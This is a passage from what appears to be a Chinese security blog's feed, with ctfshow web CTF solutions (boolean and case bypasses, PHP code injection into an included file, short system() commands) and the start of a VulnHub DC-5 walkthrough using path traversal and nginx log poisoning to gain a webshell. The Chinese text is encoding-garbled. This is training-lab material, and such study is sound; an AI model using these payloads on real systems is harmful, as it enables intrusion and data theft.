class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123; <span class="comment">#éªŒè¯æ˜¯å¦ä¸ºå¸ƒå°”å€¼ï¼Œä½†ä¸åªæ˜¯trueå’Œfalseï¼Œ1å’Œ0</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>)&#123;  <span class="comment">#å¦‚æœ$bä¸ºtrueæˆ–1éƒ½ä¸è¡Œï¼ˆ1&gt;0ï¼‰</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/30/18-qi-ta-a9fd82f748734e179cdb6705fa542fa4/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–å€¼è¿›è¡Œç»•è¿‡ï¼š</p><p><code>?b=on</code>æˆ–<code>?b=yes</code></p><h1 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_varÂ </span>(<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span>Â ||Â <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span>Â ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span>Â ||Â <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123; <span class="comment">#æ³¨æ„åˆ°onå’ŒONï¼Œå¤§å°å†™æœ‰åŒºåˆ«ï¼Œæ˜¯ä¸æ˜¯ä¸€ä¸ªå¤§å†™ä¸€ä¸ªå°å†™ä¹Ÿå¯ä»¥ç»•è¿‡å‘¢ï¼Œè€Œä¸”è¿™é‡Œæ²¡è¿‡æ»¤yes</span></span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">die</span>(<span class="string">&#x27;FLAGÂ NOTÂ HERE&#x27;</span>);</span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$flag</span>;</span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š<code>?b=On</code>æˆ–<code>?b=yes</code></p><h1 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND); <span class="comment">#FILE_APPENDä¸ºè¿½åŠ æ¨¡å¼ï¼Œè¿½åŠ åœ¨æ–‡ä»¶å†…å®¹æœ«å°¾</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å¾ˆå‘ï¼Œå¦‚æœå•çº¯ç”¨å‘½ä»¤æ‰§è¡Œlsä¹‹ç±»çš„è¯ï¼Œä¸€ä¸ªå®¹å™¨åªèƒ½ç”¨ä¸€æ¬¡ï¼Œå› ä¸º<code>//</code>ä¼šæŠŠåé¢æ·»åŠ è¿›å»çš„å†…å®¹æ³¨é‡Šæ‰ï¼Œä¸‹æ¬¡æ·»åŠ å†…å®¹å°±åœ¨æ³¨é‡Šé‡Œé¢ï¼Œè°ƒç”¨ä¸äº†</p><p>payloadï¼šPOSTï¼š<code>ctfshow=?&gt;&lt;?php system(&quot;cat *&quot;);?&gt;&lt;?</code></p><p>PS:è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥å†™ä¸ªé©¬è¿›å»</p><h1 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆPOSTè¯·æ±‚å‘é€</p><p><code>ctfshow=*/system($_GET[1]);/*</code></p><p>å†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š<span class="number">1</span>=cat flag.php|grep flag</span><br><span class="line">POSTï¼šctfshow=<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">Â Â Â Â &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Â Â Â Â Â Â Â Â <span class="keyword">echo</span>Â <span class="variable">$flag</span></span><br><span class="line">Â Â Â Â &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š<code>?ctfshow=-1</code></p><h1 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$k</span> = <span class="variable">$_GET</span>[k];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$k</span>==<span class="string">&#x27;getflag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$k</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§å°å†™ç»•è¿‡</p><p>payload:<code>?k=Getflag</code></p><h1 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]);</span><br></pre></td></tr></table></figure><p>éœ€è¦è°ƒç”¨ç±»ä¸­çš„å‡½æ•°ï¼š</p><p>payload:<code>?f=ctf::flag</code></p><h1 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$codeÂ </span>=Â <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)Â &lt;Â <span class="number">17</span>)&#123;</span><br><span class="line">Â Â Â Â <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>code=echo cat *;</code></p><h1 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>code=nl ../*</code></p><p>è‰ï¼Œä¸€ç›´ä»¥ä¸ºåœ¨<code>/tmp</code>ä¸‹é¢çš„æ˜¯flagï¼Œç„¶ååˆé™åˆ¶8ä¸ªå­—ç¬¦è¯»ä¸åˆ°</p><h1 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:<code>code=nl *</code></p><p>(æœ¬æ¥è¿˜ä»¥ä¸ºæ˜¯æ˜¯ä»€ä¹ˆæé™ç»•è¿‡ï¼Œæ²¡æƒ³åˆ°lsä¸€çœ‹ï¼Œå•ªï¼Œflagå°±åœ¨ç›®å½•ä¸‹)</p><h1 id="we422"><a href="#we422" class="headerlink" title="we422"></a>we422</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ–¹æ³•1ï¼špayload:<code>code=nl *</code></p><p>è·Ÿä¸Šé¢˜ä¸€æ ·</p><p>æ–¹æ³•2ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;cat <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹cat</span></span><br><span class="line">* <span class="comment">//æ‰§è¡Œï¼Œä¼šæŠŠæ–‡ä»¶å¤¹çš„åå­—å½“ä½œå‘½ä»¤æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC-5</title>
      <link href="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/"/>
      <url>/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/</url>
      
        <content type="html"><![CDATA[<h1 id="vulnhub-DC-5"><a href="#vulnhub-DC-5" class="headerlink" title="vulnhub-DC-5"></a>vulnhub-DC-5</h1><p>DC-5é¶åœºä¸‹è½½åœ°å€ï¼š<a href="https://www.five86.com/downloads/DC-5.zip">https://www.five86.com/downloads/DC-5.zip</a></p><p>åªéœ€è¦ä¸‹è½½ï¼Œç„¶åç”¨VMæ‰“å¼€ï¼ŒæŠŠç½‘ç»œé…ç½®æ”¹æˆnetå³å¯</p><h1 id="ç¬¬ä¸€æ­¥ï¼šå‘ç°ä¸»æœº"><a href="#ç¬¬ä¸€æ­¥ï¼šå‘ç°ä¸»æœº" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šå‘ç°ä¸»æœº"></a>ç¬¬ä¸€æ­¥ï¼šå‘ç°ä¸»æœº</h1><h2 id="æ–¹å¼ä¸€ï¼šä½¿ç”¨nmapè¿›è¡Œç½‘æ®µæ‰«æå’Œç«¯å£æ‰«æ"><a href="#æ–¹å¼ä¸€ï¼šä½¿ç”¨nmapè¿›è¡Œç½‘æ®µæ‰«æå’Œç«¯å£æ‰«æ" class="headerlink" title="æ–¹å¼ä¸€ï¼šä½¿ç”¨nmapè¿›è¡Œç½‘æ®µæ‰«æå’Œç«¯å£æ‰«æ"></a>æ–¹å¼ä¸€ï¼šä½¿ç”¨nmapè¿›è¡Œç½‘æ®µæ‰«æå’Œç«¯å£æ‰«æ</h2><p>ç½‘æ®µæ‰«æï¼Œä¸»æœºæ˜¯å¦åœ¨çº¿ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sP <span class="number">192.168</span>.<span class="number">220.0</span>/<span class="number">24</span> -oN nmap220.sP</span><br><span class="line"></span><br><span class="line">-T4ï¼šè¡¨ç¤ºè®¾ç½®æ‰«æé€Ÿåº¦ä¸º <span class="number">4</span>ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸­ç­‰çš„é€Ÿåº¦é€‰é¡¹ã€‚ä½ ä¹Ÿå¯ä»¥æ ¹æ®å®é™…æƒ…å†µè°ƒæ•´æ‰«æé€Ÿåº¦ï¼Œä¾‹å¦‚ä½¿ç”¨ -T1ï¼ˆæœ€æ…¢ï¼‰åˆ° -T5ï¼ˆæœ€å¿«ï¼‰ä¹‹é—´çš„é€‰é¡¹ã€‚</span><br><span class="line">-sPï¼šè¡¨ç¤ºè¿›è¡Œ Ping æ‰«æï¼Œå³å¯¹æŒ‡å®š IP åœ°å€èŒƒå›´å†…çš„ä¸»æœºè¿›è¡Œ ICMP Ping æ£€æµ‹ï¼Œä»¥ç¡®å®šä¸»æœºæ˜¯å¦åœ¨çº¿ã€‚</span><br><span class="line">-oN nmap220.sPï¼šè¡¨ç¤ºè¾“å‡ºæ‰«æç»“æœåˆ°æ–‡ä»¶ nmap220.sP ä¸­ï¼Œæ ¼å¼ä¸ºæ™®é€šæ–‡æœ¬ã€‚</span><br></pre></td></tr></table></figure><p>ç«¯å£æ‰«æï¼Œå‘ç°è¿è¡Œçš„æœåŠ¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 <span class="number">192.168</span>.<span class="number">153.143</span> -p- -oN <span class="number">143</span>.A</span><br><span class="line"></span><br><span class="line">-Aï¼šè¡¨ç¤ºä½¿ç”¨å…¶å®ƒé«˜çº§é€‰é¡¹è¿›è¡Œä¸»æœºæ¢æµ‹ï¼ŒåŒ…æ‹¬æ“ä½œç³»ç»Ÿæ£€æµ‹ã€ç‰ˆæœ¬æ£€æµ‹ã€è„šæœ¬æ‰«æç­‰ã€‚-A é€‰é¡¹å¯ä»¥æä¾›æ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚</span><br><span class="line">-p- è¡¨ç¤ºå…¨ç«¯å£æ‰«æ</span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><h2 id="æ–¹å¼äºŒï¼šä½¿ç”¨fscan"><a href="#æ–¹å¼äºŒï¼šä½¿ç”¨fscan" class="headerlink" title="æ–¹å¼äºŒï¼šä½¿ç”¨fscan"></a>æ–¹å¼äºŒï¼šä½¿ç”¨fscan</h2><p>ï¼ˆæ²¡æœ‰æ‰«å…¨ç«¯å£ï¼‰</p><p><img src="/Untitled-1.png" class="lazyload placeholder" data-srcset="/Untitled-1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>ç»¼åˆè€ƒè™‘ï¼Œç»è¿‡æ’é™¤ï¼Œå¯ä»¥çœ‹åˆ°<code>192.168.153.143</code>å°±æ˜¯æˆ‘ä»¬çš„é¶æœºäº†ï¼ˆæˆ‘åŒæ—¶å¼€äº†ä¸ªcentosï¼‰</p><p>ä¸€å…±å¼€æ”¾äº†ä¸‰ä¸ªç«¯å£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">34574</span></span><br><span class="line"><span class="number">111</span></span><br></pre></td></tr></table></figure><h1 id="webæ‰“ç‚¹"><a href="#webæ‰“ç‚¹" class="headerlink" title="webæ‰“ç‚¹"></a>webæ‰“ç‚¹</h1><p>è®¿é—®ä¸€ä¸‹80ç«¯å£</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-2.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-2.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>è¿™é‡Œæœ‰ä¸€äº›è¾“å…¥æ¡†,éšä¾¿è¾“ä¸€äº›ä¸œè¥¿è¿›å»è¯•è¯•</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-3.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-3.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æäº¤ååˆ°è¾¾è¿™ä¸ªé¡µé¢</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-4.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>ç„¶åæ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªç¥å¥‡çš„æ€è·¯äº†ï¼ˆä¸çœ‹wpæˆ‘çœŸæƒ³ä¸å‡ºæ¥</p><p>é€šè¿‡åˆ·æ–°æ­¤é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°ä¸‹é¢<code>Copyright Â© 2018</code>ä¸€ç›´åœ¨å˜ï¼Œè¿™é‡Œå¯ä»¥çŸ¥é“æ˜¯æ–‡ä»¶åŒ…å«ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼‰</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-5.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-6.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-6.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-7.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-7.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>çŸ¥é“æœ‰æ–‡ä»¶åŒ…å«ä¹‹åï¼Œå°±å¾—fuzzå‡ºå‚æ•°äº†ï¼ˆè¿™é‡Œå°±ä¸fuzzï¼Œç›´æ¥å°±æ˜¯æ‰‹åŠ¨<code>file</code>äº†ï¼Œç”¨<code>arjun</code>ä¹Ÿä¸å¤ªæ–¹ä¾¿ï¼Œå› ä¸ºé¡µé¢å†…å®¹ä¸€ç›´å˜åŒ–ï¼Œå½±å“åˆ¤æ–­ï¼‰</p><p>åŒ…å«ä¸€ä¸‹<code>passwd</code></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-8.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>è¯»<code>shadow</code>å‘ç°è¯»ä¸åˆ°ï¼Œåˆ¤æ–­æ˜¯æƒé™ä¸å¤Ÿï¼Œä¸æ˜¯rootè´¦å·</p><p>ç„¶åæ¥ä¸‹æ¥å°±æ˜¯è¯»dcç”¨æˆ·çš„<code>ssh</code>ï¼Œ<code>history</code>ï¼Œå‘ç°éƒ½æ²¡æœ‰</p><p>ç­‰ç­‰ï¼è¿™bydæ˜¯ä¸ªæ–‡ä»¶åŒ…å«ï¼Œä¸æ˜¯ä»»æ„æ–‡ä»¶è¯»å–ï¼Œèƒ½åšå¾—äº‹æƒ…æ›´å¤š</p><p>æˆ‘ä»¬å…ˆè¯»å–<code>nginx</code>é…ç½®æ–‡ä»¶ï¼š<code>/etc/nginx/nginx.conf</code></p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-9.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å°æŠ€å·§ï¼Œé€‰æ‹©å¹¶å³é”®æŸ¥çœ‹æºä»£ç ï¼Œè¿™æ ·æ›´æœ‰å¯é˜…æ€§ï¼Œä¸ä¼šä¹±æˆä¸€å›¢</p><p>ç„¶åæŸ¥æ‰¾nginxæ—¥å¿—ä½ç½®</p><p>çœ‹åˆ°äº†</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-10.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-10.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å°è¯•åœ¨UAå¤´å‘é€ä¸€å¥è¯æœ¨é©¬å¹¶åŒ…å«</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-11.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-11.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>å‘é€å‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.153.143/thankyou.php?file=../../../../../../../../var/log/nginx/access.log&amp;1=ls</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-12.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-12.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="Untitled"></p><p>æˆåŠŸgetshell</p><p>ä½†åˆ°è¿™é‡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆwebshellå·¥å…·éƒ½çªç„¶å‘dianäº†ï¼Œè¿æ¥ä¸ä¸Šï¼Œåˆå› ä¸ºè¿™ä¸ªæ—¥å¿—æ–‡ä»¶å¤ªå¤§äº†ï¼Œæ‰€ä»¥æˆ‘æƒ³é‡æ–°ä¸Šä¸ªé©¬ï¼Œç›´æ¥<code>touch</code>åˆ›å»ºä¸äº†ï¼Œå› ä¸ºæƒé™ä¸å¤Ÿ</p><p>æ‰€ä»¥äº†phpæ¥åˆ›å»ºï¼ˆè¯·è®°ä½æˆ‘å†™çš„è¿™ä¸ªsbä»£ç ï¼Œç›´æ¥æŠŠæ—¥å¿—æ–‡ä»¶ç»™æä¸‹çº¿äº†ï¼ˆåŸå› ä¸æ˜</p><p><img src="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-13.png" class="lazyload placeholder" data-srcset="/2023/06/29/vulnhub-dc-5-3d93eb92083c4cc6af68de1fa9af2037/Untitled-13.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 